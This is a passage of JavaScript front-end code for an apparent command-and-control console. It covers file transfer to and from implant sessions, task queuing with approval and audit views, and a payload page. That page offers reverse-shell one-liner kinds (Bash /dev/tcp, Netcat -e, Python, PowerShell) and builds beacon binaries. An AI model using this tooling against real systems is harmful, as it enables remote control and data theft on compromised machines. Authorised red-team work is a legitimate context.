        if (fill) fill.style.width = Math.max(0, Math.min(100, percent || 0)) + '%';
        if (label) {
            label.textContent = c2t('c2.files.uploading', { name: filename || '', percent: percent || 0 });
        }
    };

    C2.openFileUploadPicker = function() {
        if (!C2.selectedSessionId || C2.fileUploadBusy) return;
        var session = C2.sessions.find(function(s) { return s.id === C2.selectedSessionId; });
        var cap = C2.sessionSupportsUpload(session);
        if (!cap.supported) {
            showToast(c2t(cap.reasonKey), 'warn');
            return;
        }
        var inp = document.getElementById('c2-file-upload-input');
        if (inp) inp.click();
    };

    C2.onC2FileUploadPick = function(ev) {
        var input = ev && ev.target;
        var file = input && input.files && input.files[0];
        if (!file) return;
        if (input) input.value = '';
        C2.uploadFileToImplant(file);
    };

    C2.uploadFileToImplant = function(file) {
        if (!C2.selectedSessionId || C2.fileUploadBusy || !file) return;
        var sessionId = C2.selectedSessionId;
        var remotePath = C2.resolveRemotePath(C2.currentPath || '.', file.name);
        var uploadUrl = API_BASE + '/files/upload';

        C2.fileUploadBusy = true;
        C2.updateFileUploadButton();
        C2.setFileUploadProgress(true, 0, file.name);

        var form = new FormData();
        form.append('session_id', sessionId);
        form.append('remote_path', remotePath);
        form.append('file', file);

        var uploadPromise;
        if (typeof apiUploadWithProgress === 'function') {
            uploadPromise = apiUploadWithProgress(uploadUrl, form, {
                onProgress: function(p) {
                    C2.setFileUploadProgress(true, Math.min(p.percent || 0, 50), file.name);
                }
            });
        } else if (typeof apiFetch === 'function') {
            uploadPromise = apiFetch(uploadUrl, { method: 'POST', body: form });
        } else {
            uploadPromise = fetch(uploadUrl, { method: 'POST', body: form });
        }

        uploadPromise.then(function(res) {
            if (!res.ok) {
                return res.text().then(function(text) {
                    throw new Error(text || c2t('c2.files.failed'));
                });
            }
            return res.json();
        }).then(function(uploadData) {
            var fileId = uploadData && uploadData.file_id;
            if (!fileId) throw new Error(c2t('c2.files.failed'));
            C2.setFileUploadProgress(true, 55, file.name);
            return apiRequest('POST', API_BASE + '/tasks', {
                session_id: sessionId,
                task_type: 'upload',
                payload: { remote_path: remotePath, file_id: fileId }
            });
        }).then(function(taskData) {
            if (taskData && taskData.error) throw new Error(taskData.error);
            var taskId = taskData.task && taskData.task.id ? taskData.task.id : taskData.task_id;
            if (!taskId) {
                showToast(c2t('c2.files.uploadQueued'), 'success');
                C2.fileUploadBusy = false;
                C2.setFileUploadProgress(false);
                C2.updateFileUploadButton();
                return;
            }
            if (taskData.task && taskData.task.approvalStatus === 'pending') {
                showToast(c2t('c2.files.uploadPendingApproval'), 'info');
            }
            C2.waitForFileUpload(taskId, file.name);
        }).catch(function(err) {
            showToast((err && err.message) || c2t('c2.files.failed'), 'error');
            C2.fileUploadBusy = false;
            C2.setFileUploadProgress(false);
            C2.updateFileUploadButton();
        });
    };

    C2.waitForFileUpload = function(taskId, filename) {
        var attempts = 0;
        var check = function() {
            if (++attempts > 120) {
                showToast(c2t('c2.files.timeout'), 'error');
                C2.fileUploadBusy = false;
                C2.setFileUploadProgress(false);
                C2.updateFileUploadButton();
                return;
            }
            apiRequest('GET', API_BASE + '/tasks/' + taskId).then(function(data) {
                var task = data.task;
                if (task && task.approvalStatus === 'pending' && task.status === 'queued') {
                    C2.setFileUploadProgress(true, 60, filename);
                    setTimeout(check, 1000);
                    return;
                }
                if (task && task.status === 'success') {
                    C2.setFileUploadProgress(true, 100, filename);
                    showToast(c2t('c2.files.uploadOk'), 'success');
                    C2.fileUploadBusy = false;
                    setTimeout(function() { C2.setFileUploadProgress(false); }, 400);
                    C2.updateFileUploadButton();
                    C2.refreshFiles();
                } else if (task && task.status === 'failed') {
                    showToast(task.error || task.resultText || c2t('c2.files.failed'), 'error');
                    C2.fileUploadBusy = false;
                    C2.setFileUploadProgress(false);
                    C2.updateFileUploadButton();
                } else {
                    var pct = 60 + Math.min(35, Math.floor(attempts / 3));
                    C2.setFileUploadProgress(true, pct, filename);
                    setTimeout(check, 500);
                }
            }).catch(function() {
                C2.fileUploadBusy = false;
                C2.setFileUploadProgress(false);
                C2.updateFileUploadButton();
            });
        };
        check();
    };

    C2.saveDownloadBlob = function(blob, filename) {
        const a = document.createElement('a');
        a.href = URL.createObjectURL(blob);
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        a.remove();
        URL.revokeObjectURL(a.href);
    };

    C2.saveDownloadContent = function(content, filename) {
        const text = String(content || '');
        if (C2.isDownloadShellError(text)) {
            throw new Error(text.trim() || c2t('c2.files.failed'));
        }
        const b64 = text.replace(/\s/g, '');
        let bytes;
        try {
            if (/^[A-Za-z0-9+/=]+$/.test(b64) && b64.length > 0) {
                const binary = atob(b64);
                bytes = new Uint8Array(binary.length);
                for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
            } else {
                bytes = new TextEncoder().encode(text);
            }
        } catch (e) {
            bytes = new TextEncoder().encode(text);
        }
        C2.saveDownloadBlob(new Blob([bytes], { type: 'application/octet-stream' }), filename);
    };

    C2.fetchTaskResultFile = function(taskId, filename) {
        const url = `${API_BASE}/tasks/${taskId}/result-file`;
        const fetchFn = (typeof apiFetch === 'function') ? apiFetch : fetch;
        fetchFn(url).then(resp => {
            if (!resp.ok) throw new Error('download failed: ' + resp.status);
            return resp.blob();
        }).then(blob => {
            C2.saveDownloadBlob(blob, filename);
        }).catch(err => {
            showToast((err && err.message) || c2t('c2.files.failed'), 'error');
        });
    };

    C2.waitForFileDownload = function(taskId, filename) {
        let attempts = 0;
        const check = () => {
            if (++attempts > 120) {
                showToast(c2t('c2.files.timeout'), 'error');
                return;
            }
            apiRequest('GET', `${API_BASE}/tasks/${taskId}`).then(data => {
                const task = data.task;
                if (task && task.status === 'success') {
                    if (task.resultBlobPath) {
                        C2.fetchTaskResultFile(taskId, filename);
                    } else if (task.resultText != null) {
                        try {
                            C2.saveDownloadContent(task.resultText, filename);
                            showToast(c2t('c2.files.downloadOk'), 'success');
                        } catch (err) {
                            showToast((err && err.message) || c2t('c2.files.failed'), 'error');
                        }
                    } else {
                        C2.saveDownloadBlob(new Blob([], { type: 'application/octet-stream' }), filename);
                        showToast(c2t('c2.files.downloadOk'), 'success');
                    }
                } else if (task && task.status === 'failed') {
                    showToast(task.error || task.resultText || c2t('c2.files.failed'), 'error');
                } else {
                    setTimeout(check, 500);
                }
            });
        };
        check();
    };

    C2.downloadFile = function(filename) {
        if (!C2.selectedSessionId) return;
        const remotePath = C2.resolveRemotePath(C2.currentPath || '.', filename);

        apiRequest('POST', `${API_BASE}/tasks`, {
            session_id: C2.selectedSessionId,
            task_type: 'download',
            payload: { remote_path: remotePath }
        }).then(data => {
            if (data.error) {
                showToast(data.error, 'error');
                return;
            }
            const taskId = data.task?.id || data.task_id;
            if (!taskId) {
                showToast(c2t('c2.payloads.toastDownloadQueued'), 'success');
                return;
            }
            C2.waitForFileDownload(taskId, filename);
        });
    };

    // ============================================================================
    // 任务管理
    // ============================================================================

    C2.loadTasks = function(page) {
        const p = page != null ? page : (C2.tasksPage || 1);
        C2.tasksPage = p;
        const ps = C2.tasksPageSize || 10;
        apiRequest('GET', `${API_BASE}/tasks?page=${encodeURIComponent(String(p))}&page_size=${encodeURIComponent(String(ps))}`).then(data => {
            if (data.error) {
                showToast(String(data.error), 'error');
                return;
            }
            C2.tasks = data.tasks || [];
            C2.tasksTotal = typeof data.total === 'number' ? data.total : (C2.tasks.length || 0);
            if (typeof data.pending_queued_count === 'number') {
                C2.tasksPendingQueuedCount = data.pending_queued_count;
            }
            const maxPage = Math.max(1, Math.ceil(C2.tasksTotal / ps));
            if (p > maxPage) {
                C2.loadTasks(maxPage);
                return;
            }
            C2.renderTasks();
            C2.renderTasksPagination();
            C2.syncTasksToolbar();
        }).catch(err => {
            showToast(err.message || String(err), 'error');
        });
    };

    C2.goTasksPage = function(targetPage) {
        const totalPages = Math.max(1, Math.ceil((C2.tasksTotal || 0) / (C2.tasksPageSize || 10)));
        if (targetPage < 1 || targetPage > totalPages) return;
        C2.loadTasks(targetPage);
        const list = document.getElementById('c2-task-list');
        if (list) list.scrollIntoView({ behavior: 'smooth', block: 'start' });
    };

    C2.changeTasksPageSize = function() {
        const sel = document.getElementById('c2-tasks-page-size-pagination');
        if (!sel) return;
        const n = parseInt(sel.value, 10);
        if (n > 0) {
            C2.tasksPageSize = n;
            C2.loadTasks(1);
        }
    };

    C2.renderTasksPagination = function() {
        const paginationContainer = document.getElementById('c2-tasks-pagination');
        if (!paginationContainer) return;
        const total = C2.tasksTotal || 0;
        const currentPage = C2.tasksPage || 1;
        const pageSize = C2.tasksPageSize || 10;
        const totalPages = Math.max(1, Math.ceil(total / pageSize));
        if (total === 0) {
            paginationContainer.innerHTML = '';
            return;
        }
        const start = total === 0 ? 0 : (currentPage - 1) * pageSize + 1;
        const end = Math.min(currentPage * pageSize, total);
        let html = '<div class="monitor-pagination">';
        html += `
            <div class="pagination-info">
                <span>${escapeHtml(c2t('c2.tasks.paginationShow', { start, end, total }))}</span>
                <label class="pagination-page-size">
                    ${escapeHtml(c2t('c2.tasks.paginationPerPage'))}
                    <select id="c2-tasks-page-size-pagination" onchange="C2.changeTasksPageSize()">
                        <option value="10" ${pageSize === 10 ? 'selected' : ''}>10</option>
                        <option value="20" ${pageSize === 20 ? 'selected' : ''}>20</option>
                        <option value="50" ${pageSize === 50 ? 'selected' : ''}>50</option>
                        <option value="100" ${pageSize === 100 ? 'selected' : ''}>100</option>
                    </select>
                </label>
            </div>
            <div class="pagination-controls">
                <button type="button" class="btn-secondary" onclick="C2.goTasksPage(1)" ${currentPage === 1 ? 'disabled' : ''}>${escapeHtml(c2t('c2.tasks.paginationFirst'))}</button>
                <button type="button" class="btn-secondary" onclick="C2.goTasksPage(${currentPage - 1})" ${currentPage === 1 ? 'disabled' : ''}>${escapeHtml(c2t('c2.tasks.paginationPrev'))}</button>
                <span class="pagination-page">${escapeHtml(c2t('c2.tasks.paginationPage', { current: currentPage, total: totalPages }))}</span>
                <button type="button" class="btn-secondary" onclick="C2.goTasksPage(${currentPage + 1})" ${currentPage >= totalPages ? 'disabled' : ''}>${escapeHtml(c2t('c2.tasks.paginationNext'))}</button>
                <button type="button" class="btn-secondary" onclick="C2.goTasksPage(${totalPages})" ${currentPage >= totalPages ? 'disabled' : ''}>${escapeHtml(c2t('c2.tasks.paginationLast'))}</button>
            </div>
        `;
        html += '</div>';
        paginationContainer.innerHTML = html;
        if (typeof applyTranslations === 'function') applyTranslations(paginationContainer);
    };

    C2.collectCheckedTaskIds = function() {
        return Array.from(document.querySelectorAll('.c2-task-row-check:checked')).map(cb => cb.getAttribute('data-id')).filter(Boolean);
    };

    C2.syncTasksToolbar = function() {
        const batchBtn = document.getElementById('c2-tasks-batch-delete');
        const ids = C2.collectCheckedTaskIds();
        if (batchBtn) batchBtn.disabled = ids.length === 0;
        const all = document.querySelectorAll('.c2-task-row-check');
        const selAll = document.getElementById('c2-tasks-select-all');
        if (selAll && all.length) {
            const nChecked = document.querySelectorAll('.c2-task-row-check:checked').length;
            selAll.checked = nChecked === all.length;
            selAll.indeterminate = nChecked > 0 && nChecked < all.length;
        } else if (selAll) {
            selAll.checked = false;
            selAll.indeterminate = false;
        }
    };

    C2.onTasksSelectAll = function(checked) {
        document.querySelectorAll('.c2-task-row-check').forEach(cb => { cb.checked = checked; });
        C2.syncTasksToolbar();
    };

    C2.deleteTaskById = function(id) {
        if (!id) return;
        if (!confirm(c2t('c2.tasks.confirmDeleteOne'))) return;
        apiRequest('DELETE', `${API_BASE}/tasks`, { ids: [id] }).then(data => {
            if (data.error) {
                showToast(String(data.error), 'error');
                return;
            }
            showToast(c2t('c2.tasks.toastDeleted', { n: data.deleted != null ? data.deleted : 1 }), 'success');
            C2.loadTasks(C2.tasksPage || 1);
        }).catch(err => showToast(err.message || String(err), 'error'));
    };

    C2.deleteSelectedTasks = function() {
        const ids = C2.collectCheckedTaskIds();
        if (!ids.length) {
            showToast(c2t('c2.tasks.toastSelectFirst'), 'warn');
            return;
        }
        if (!confirm(c2t('c2.tasks.confirmBatchDelete', { n: ids.length }))) return;
        apiRequest('DELETE', `${API_BASE}/tasks`, { ids }).then(data => {
            if (data.error) {
                showToast(String(data.error), 'error');
                return;
            }
            const deleted = data.deleted != null ? data.deleted : ids.length;
            showToast(c2t('c2.tasks.toastDeleted', { n: deleted }), 'success');
            C2.loadTasks(C2.tasksPage || 1);
        }).catch(err => showToast(err.message || String(err), 'error'));
    };

    C2.loadSessionTasks = function(sessionId) {
        apiRequest('GET', `${API_BASE}/tasks?session_id=${encodeURIComponent(sessionId)}&limit=50`).then(data => {
            const container = document.getElementById('c2-session-tasks-list');
            const tasks = data.tasks || [];
            if (typeof data.pending_queued_count === 'number') {
                C2.tasksPendingQueuedCount = data.pending_queued_count;
            }
            
            if (!container) return;
            if (tasks.length === 0) {
                container.innerHTML = '<div class="c2-empty">' + escapeHtml(c2t('c2.tasks.emptySession')) + '</div>';
                return;
            }
            
            container.innerHTML = tasks.map(t => {
                const rawId = t.id || '';
                const cmd = formatTaskCommand(t);
                const cmdShort = truncateCommand(cmd, 40);
                return `
                <div class="c2-task-item-compact">
                    <span class="c2-task-status-dot ${escapeHtml(t.status || '')}"></span>
                    <span class="c2-task-type">${escapeHtml(t.taskType || '')}</span>
                    ${cmdShort ? `<span class="c2-task-command" title="${escapeHtml(cmd)}">${escapeHtml(cmdShort)}</span>` : ''}
                    <span class="c2-task-meta">${escapeHtml(taskStatusLabel(t.status))} | ${formatDuration(t.durationMs)}</span>
                    <button type="button" class="btn-secondary btn-small" data-c2-task-action="view" data-task-id="${escapeHtml(rawId)}">${escapeHtml(c2t('c2.tasks.view'))}</button>
                </div>
            `;
            }).join('');
        });
    };

    C2.renderTasks = function() {
        const container = document.getElementById('c2-task-list');
        if (!container) return;

        const selAll = document.getElementById('c2-tasks-select-all');
        if (selAll) {
            selAll.checked = false;
            selAll.indeterminate = false;
        }

        if (C2.tasks.length === 0) {
            container.innerHTML = '<div class="c2-empty">' + escapeHtml(c2t('c2.tasks.emptyAll')) + '</div>';
            if (selAll) selAll.disabled = true;
            C2.syncTasksToolbar();
            return;
        }
        if (selAll) selAll.disabled = false;

        const delTitle = escapeHtml(c2t('c2.tasks.deleteOne'));
        container.innerHTML = `
            <table class="c2-task-table">
                <thead>
                    <tr>
                        <th class="c2-task-table-col-check"></th>
                        <th>${escapeHtml(c2t('c2.tasks.colTask'))}</th>
                        <th>${escapeHtml(c2t('c2.tasks.colSession'))}</th>
                        <th>${escapeHtml(c2t('c2.tasks.colType'))}</th>
                        <th>${escapeHtml(c2t('c2.tasks.colCommand'))}</th>
                        <th>${escapeHtml(c2t('c2.tasks.colStatus'))}</th>
                        <th>${escapeHtml(c2t('c2.tasks.colDuration'))}</th>
                        <th>${escapeHtml(c2t('c2.tasks.colCreated'))}</th>
                        <th class="c2-task-table-col-actions">${escapeHtml(c2t('c2.tasks.colActions'))}</th>
                    </tr>
                </thead>
                <tbody>
                    ${C2.tasks.map(t => {
                        const rawId = t.id || '';
                        const shortTaskId = rawId.length > 14 ? escapeHtml(rawId.substring(0, 12)) + '\u2026' : escapeHtml(rawId);
                        const sid = t.sessionId ? escapeHtml(String(t.sessionId).substring(0, 8)) + '\u2026' : '-';
                        const cmd = formatTaskCommand(t);
                        const cmdShort = truncateCommand(cmd, 48);
                        return `
                        <tr>
                            <td class="c2-task-table-col-check">
                                <label class="c2-task-check-label" onclick="event.stopPropagation();">
                                    <input type="checkbox" class="c2-task-row-check" data-id="${escapeHtml(rawId)}" onchange="C2.syncTasksToolbar()">
                                </label>
                            </td>
                            <td>${shortTaskId}</td>
                            <td>${sid}</td>
                            <td>${escapeHtml(t.taskType || '')}</td>
                            <td class="c2-task-command-cell" title="${escapeHtml(cmd)}">${cmdShort ? escapeHtml(cmdShort) : '<span class="c2-muted">-</span>'}</td>
                            <td><span class="c2-status-badge ${escapeHtml(t.status || '')}">${escapeHtml(taskStatusLabel(t.status))}</span></td>
                            <td>${formatDuration(t.durationMs)}</td>
                            <td>${formatTime(t.createdAt)}</td>
                            <td class="c2-task-table-col-actions">
                                <div class="c2-task-table-actions">
                                <button type="button" class="btn-secondary btn-small" data-c2-task-action="view" data-task-id="${escapeHtml(rawId)}">${escapeHtml(c2t('c2.tasks.view'))}</button>
                                ${t.status === 'queued' || t.status === 'sent'
                                    ? `<button type="button" class="btn-danger btn-small" data-c2-task-action="cancel" data-task-id="${escapeHtml(rawId)}">${escapeHtml(c2t('c2.tasks.cancelBtn'))}</button>`
                                    : ''}
                                <button type="button" class="btn-danger btn-small" data-c2-task-action="delete" data-task-id="${escapeHtml(rawId)}" title="${delTitle}" aria-label="${delTitle}">${escapeHtml(c2t('c2.tasks.deleteBtn'))}</button>
                                </div>
                            </td>
                        </tr>
                    `;
                    }).join('')}
                </tbody>
            </table>
        `;
        C2.syncTasksToolbar();
        if (typeof applyTranslations === 'function') applyTranslations(container);
    };

    C2.viewTask = function(id) {
        const modal = document.getElementById('c2-modal');
        const content = document.getElementById('c2-modal-content');
        if (!content) return;

        const renderTaskModal = function(t) {
            if (!t || !modal) return;
            const cmd = formatTaskCommand(t);
            const hasPayload = t.payload && typeof t.payload === 'object' && Object.keys(t.payload).length > 0;
            const modalBox = modal.querySelector('.c2-modal');
            if (modalBox) modalBox.classList.add('c2-modal--wide');
            content.innerHTML = `
            <div class="c2-modal-header c2-task-modal-header">
                <div class="c2-task-modal-heading">
                    <h3>${escapeHtml(c2t('c2.tasks.modalTitle'))}</h3>
                    <span class="c2-status-badge ${escapeHtml(t.status || '')}">${escapeHtml(taskStatusLabel(t.status))}</span>
                </div>
                <button class="c2-modal-close" onclick="C2.closeModal()">&times;</button>
            </div>
            <div class="c2-modal-body">
                <div class="c2-task-detail">
                    <div class="c2-task-detail-grid">
                        <div class="c2-task-kv">
                            <span class="c2-task-kv__label">${escapeHtml(c2t('c2.tasks.labelId'))}</span>
                            <span class="c2-task-kv__value c2-task-kv__value--mono">${escapeHtml(t.id || '-')}</span>
                        </div>
                        <div class="c2-task-kv">
                            <span class="c2-task-kv__label">${escapeHtml(c2t('c2.tasks.labelSession'))}</span>
                            <span class="c2-task-kv__value c2-task-kv__value--mono">${escapeHtml(t.sessionId || '-')}</span>
                        </div>
                        <div class="c2-task-kv">
                            <span class="c2-task-kv__label">${escapeHtml(c2t('c2.tasks.labelType'))}</span>
                            <span class="c2-task-kv__value">${escapeHtml(t.taskType || '-')}</span>
                        </div>
                        <div class="c2-task-kv">
                            <span class="c2-task-kv__label">${escapeHtml(c2t('c2.tasks.labelDuration'))}</span>
                            <span class="c2-task-kv__value c2-task-kv__value--accent">${formatDuration(t.durationMs)}</span>
                        </div>
                    </div>

                    <div class="c2-task-timeline">
                        <div class="c2-task-time-card">
                            <span class="c2-task-kv__label">${escapeHtml(c2t('c2.tasks.labelCreated'))}</span>
                            <span class="c2-task-kv__value">${formatTime(t.createdAt) || '-'}</span>
                        </div>
                        <div class="c2-task-time-card">
                            <span class="c2-task-kv__label">${escapeHtml(c2t('c2.tasks.labelSent'))}</span>
                            <span class="c2-task-kv__value">${formatTime(t.sentAt) || '-'}</span>
                        </div>
                        <div class="c2-task-time-card">
                            <span class="c2-task-kv__label">${escapeHtml(c2t('c2.tasks.labelCompleted'))}</span>
                            <span class="c2-task-kv__value">${formatTime(t.completedAt) || '-'}</span>
                        </div>
                    </div>

                    ${cmd ? `
                        <div class="c2-task-code-section">
                            <div class="c2-task-code-header">
                                <span class="c2-task-code-title">${escapeHtml(c2t('c2.tasks.labelCommand'))}</span>
                                <button type="button" class="btn-ghost btn-sm" onclick="C2.copyTaskBlock('c2-task-cmd-pre')">${escapeHtml(c2t('common.copy'))}</button>
                            </div>
                            <pre class="c2-task-command-pre" id="c2-task-cmd-pre">${escapeHtml(cmd)}</pre>
                        </div>
                    ` : ''}
                    ${hasPayload && !cmd ? `
                        <div class="c2-task-code-section">
                            <div class="c2-task-code-header">
                                <span class="c2-task-code-title">${escapeHtml(c2t('c2.tasks.labelPayload'))}</span>
                                <button type="button" class="btn-ghost btn-sm" onclick="C2.copyTaskBlock('c2-task-payload-pre')">${escapeHtml(c2t('common.copy'))}</button>
                            </div>
                            <pre class="c2-task-command-pre" id="c2-task-payload-pre">${escapeHtml(JSON.stringify(t.payload, null, 2))}</pre>
                        </div>
                    ` : ''}
                    ${t.error ? `
                        <div class="c2-task-error-section">
                            <div class="c2-task-code-header">
                                <span class="c2-task-code-title">${escapeHtml(c2t('c2.tasks.labelError'))}</span>
                            </div>
                            <div class="c2-task-error">${escapeHtml(t.error)}</div>
                        </div>
                    ` : ''}
                    ${t.resultText ? `
                        <div class="c2-task-code-section">
                            <div class="c2-task-code-header">
                                <span class="c2-task-code-title">${escapeHtml(c2t('c2.tasks.labelResult'))}</span>
                                <button type="button" class="btn-ghost btn-sm" onclick="C2.copyTaskBlock('c2-task-result-pre')">${escapeHtml(c2t('common.copy'))}</button>
                            </div>
                            <pre class="c2-task-result-pre" id="c2-task-result-pre">${escapeHtml(t.resultText)}</pre>
                        </div>
                    ` : ''}
                </div>
            </div>
            <div class="c2-modal-footer">
                <button class="btn-secondary" onclick="C2.closeModal()">${escapeHtml(c2t('common.close'))}</button>
            </div>
        `;
            modal.style.display = 'flex';
        };

        const local = C2.tasks.find(x => x.id === id);
        if (local) {
            renderTaskModal(local);
            return;
        }
        apiRequest('GET', `${API_BASE}/tasks/${encodeURIComponent(id)}`).then(data => {
            if (data.error) {
                showToast(String(data.error), 'error');
                return;
            }
            if (data.task) renderTaskModal(data.task);
            else showToast(c2t('c2.tasks.emptyAll'), 'warn');
        }).catch(err => showToast(err.message || String(err), 'error'));
    };

    C2.cancelTask = function(id) {
        apiRequest('POST', `${API_BASE}/tasks/${encodeURIComponent(id)}/cancel`, {}).then(data => {
            if (data.error) showToast(String(data.error), 'error');
            else {
                showToast(c2t('c2.tasks.toastCancelled'), 'success');
                C2.loadTasks(C2.tasksPage || 1);
            }
        }).catch(err => showToast(err.message || String(err), 'error'));
    };

    // ============================================================================
    // Payload 生成
    // ============================================================================

    C2.loadListenersForPayload = function() {
        apiRequest('GET', `${API_BASE}/listeners`).then(data => {
            if (data.error) {
                showToast(data.error, 'error');
                return;
            }
            C2.listeners = data.listeners || [];
            C2.renderPayloadPage();
        }).catch(err => {
            showToast(c2t('c2.payloads.toastLoadListenersFail', { msg: err.message || '' }), 'error');
        });
    };

    var onelinerKindsByListenerType = {
        'tcp_reverse': [
            { value: 'bash',       label: 'Bash (/dev/tcp)' },
            { value: 'nc',         label: 'Netcat (-e)' },
            { value: 'nc_mkfifo',  label: 'Netcat (mkfifo)' },
            { value: 'python',     label: 'Python' },
            { value: 'perl',       label: 'Perl' },
            { value: 'powershell', label: 'PowerShell' }
        ],
        'http_beacon': [
            { value: 'curl_beacon', label: 'Curl Beacon (HTTP)' }
        ],
        'https_beacon': [
            { value: 'curl_beacon', label: 'Curl Beacon (HTTP)' }
        ],
        'websocket': [
            { value: 'curl_beacon', label: 'Curl Beacon (HTTP)' }
        ]
    };

    C2.updateOnelinerKinds = function() {
        var listenerSelect = document.getElementById('c2-payload-listener');
        var kindSelect = document.getElementById('c2-payload-kind');
        if (!listenerSelect || !kindSelect) return;

        var listenerId = listenerSelect.value;
        var listener = (C2.listeners || []).find(function(l) { return l.id === listenerId; });
        var ltype = listener ? listener.type : '';
        var kinds = onelinerKindsByListenerType[ltype] || [];

        if (kinds.length === 0) {
            kindSelect.innerHTML = '<option value="">' + escapeHtml(c2t('c2.payloads.noKindOption')) + '</option>';
        } else {
            kindSelect.innerHTML = kinds.map(function(k) {
                return '<option value="' + k.value + '">' + k.label + '</option>';
            }).join('');
        }
    };

    C2.updateLoopbackBuildHint = function() {
        const sel = document.getElementById('c2-build-listener');
        const hint = document.getElementById('c2-build-loopback-hint');
        if (!hint) return;
        const override = document.getElementById('c2-build-host') && String(document.getElementById('c2-build-host').value || '').trim();
        if (override) {
            hint.style.display = 'none';
            return;
        }
        const id = sel && sel.value;
        if (!id) {
            hint.style.display = 'none';
            return;
        }
        const l = (C2.listeners || []).find(function(x) { return x.id === id; });
        const h = (l && l.bindHost ? String(l.bindHost) : '').toLowerCase().trim();
        if (h === '127.0.0.1' || h === 'localhost' || h === '::1') {
            hint.textContent = c2t('c2.payloads.loopbackBeaconWarning');
            hint.style.display = 'block';
        } else {
            hint.style.display = 'none';
        }
    };

    C2.renderPayloadPage = function() {
        const optionsHtml = C2.listeners.length > 0
            ? C2.listeners.map(l =>
                `<option value="${l.id}">${escapeHtml(l.name)} (${l.type} ${l.bindHost}:${l.bindPort})</option>`
              ).join('')
            : '<option value="">' + escapeHtml(c2t('c2.payloads.noListenersOption')) + '</option>';

        const listenerSelect = document.getElementById('c2-payload-listener');
        if (listenerSelect) {
            listenerSelect.innerHTML = optionsHtml;
            listenerSelect.removeEventListener('change', C2.updateOnelinerKinds);
            listenerSelect.addEventListener('change', C2.updateOnelinerKinds);
        }

        const buildSelect = document.getElementById('c2-build-listener');
        if (buildSelect) {
            const listeners = C2.listeners || [];
            let buildOptionsHtml;
            if (listeners.length > 0) {
                buildOptionsHtml = listeners.map(l =>
                    `<option value="${l.id}">${escapeHtml(l.name)} (${l.type} ${l.bindHost}:${l.bindPort})</option>`
                ).join('');
            } else {
                buildOptionsHtml = '<option value="">' + escapeHtml(c2t('c2.payloads.noListenersOption')) + '</option>';
            }
            buildSelect.innerHTML = buildOptionsHtml;
            buildSelect.removeEventListener('change', C2.updateLoopbackBuildHint);
            buildSelect.addEventListener('change', C2.updateLoopbackBuildHint);
            C2.updateLoopbackBuildHint();
        }

        const buildHostInput = document.getElementById('c2-build-host');
        if (buildHostInput) {
            buildHostInput.removeEventListener('input', C2.updateLoopbackBuildHint);
            buildHostInput.addEventListener('input', C2.updateLoopbackBuildHint);
        }

        C2.updateOnelinerKinds();
        const buildBtn = document.getElementById('c2-build-btn');
        if (buildBtn && !buildBtn.disabled) buildBtn.textContent = c2t('c2.payloads.buildBeaconBtn');
        const genBtn = document.getElementById('c2-generate-oneliner-btn');
        if (genBtn) genBtn.textContent = c2t('c2.payloads.generateOnelinerBtn');
    };

    C2.generateOneliner = function() {
        const listenerId = document.getElementById('c2-payload-listener')?.value;
        const kind = document.getElementById('c2-payload-kind')?.value || 'bash';
        const host = document.getElementById('c2-payload-host')?.value;

        if (!listenerId) {
            showToast(c2t('c2.payloads.toastPickListener'), 'error');
            return;
        }

        apiRequest('POST', `${API_BASE}/payloads/oneliner`, {
            listener_id: listenerId,
            kind: kind,
            host: host
        }).then(data => {
            if (data.error) {
                showToast(data.error, 'error');
            } else {
                const output = document.getElementById('c2-oneliner-output');
                if (output) {
                    output.textContent = data.oneliner;
                    output.style.display = 'block';
                }
            }
        }).catch(err => {
            showToast(c2t('c2.payloads.toastOnelinerFail', { msg: err.message || '' }), 'error');
        });
    };

    C2.copyOneliner = function() {
        const el = document.getElementById('c2-oneliner-output');
        if (el && el.textContent) copyToClipboard(el.textContent);
    };

    C2.buildBeacon = function() {
        const listenerId = document.getElementById('c2-build-listener')?.value;
        const os = document.getElementById('c2-build-os')?.value || 'linux';
        const arch = document.getElementById('c2-build-arch')?.value || 'amd64';
        const host = document.getElementById('c2-build-host')?.value;

        if (!listenerId) {
            showToast(c2t('c2.payloads.toastPickListener'), 'error');
            return;
        }

        const btn = document.getElementById('c2-build-btn');
        if (btn) {
            btn.disabled = true;
            btn.textContent = c2t('c2.payloads.building');
        }

        apiRequest('POST', `${API_BASE}/payloads/build`, {
            listener_id: listenerId,
            os: os,
            arch: arch,
            host: host
        }).then(data => {
            if (btn) {
                btn.disabled = false;
                btn.textContent = c2t('c2.payloads.buildBeaconBtn');
            }
            if (data.error) {
                showToast(data.error, 'error');
            } else {
                showToast(c2t('c2.payloads.toastBuildSuccess', { bytes: data.payload?.size_bytes }), 'success');
                const result = document.getElementById('c2-build-result');
                if (result) {
                    result.innerHTML = `
                        <div class="c2-build-success">
                            <div>✓ ${escapeHtml(c2t('c2.payloads.buildSuccessTitle'))}</div>
                            <div>${escapeHtml(c2t('c2.payloads.buildMetaOsArch', { os: data.payload?.os, arch: data.payload?.arch }))}</div>
                            <div>${escapeHtml(c2t('c2.payloads.buildSize', { bytes: data.payload?.size_bytes }))}</div>
                            <button onclick="window.__c2DownloadPayload('${data.payload?.download_path?.split('/').pop()}')"
                               class="btn-primary" style="margin-top:8px;display:inline-block;cursor:pointer;">${escapeHtml(c2t('c2.payloads.download'))}</button>
                        </div>
                    `;
                }
            }
        }).catch(err => {
            if (btn) {
                btn.disabled = false;
                btn.textContent = c2t('c2.payloads.buildBeaconBtn');
            }
            showToast(c2t('c2.payloads.toastBuildFail', { msg: err.message || '' }), 'error');
        });
    };

    // ============================================================================
    // 事件审计
    // ============================================================================

    C2.loadEvents = function(page) {
        const p = page != null ? page : (C2.eventsPage || 1);
        C2.eventsPage = p;
        const ps = C2.eventsPageSize || 10;
        apiRequest('GET', `${API_BASE}/events?page=${encodeURIComponent(String(p))}&page_size=${encodeURIComponent(String(ps))}`).then(data => {
            if (data.error) {
                showToast(String(data.error), 'error');
                return;
            }
            C2.events = data.events || [];
            C2.eventsTotal = typeof data.total === 'number' ? data.total : (C2.events.length || 0);
            const maxPage = Math.max(1, Math.ceil(C2.eventsTotal / ps));
            if (p > maxPage) {
                C2.loadEvents(maxPage);
                return;
            }
            C2.renderEvents();
            C2.renderEventsPagination();
            C2.syncEventsToolbar();
        }).catch(err => {
            showToast(err.message || String(err), 'error');
        });
    };

    C2.goEventsPage = function(targetPage) {
        const totalPages = Math.max(1, Math.ceil((C2.eventsTotal || 0) / (C2.eventsPageSize || 10)));
        if (targetPage < 1 || targetPage > totalPages) return;
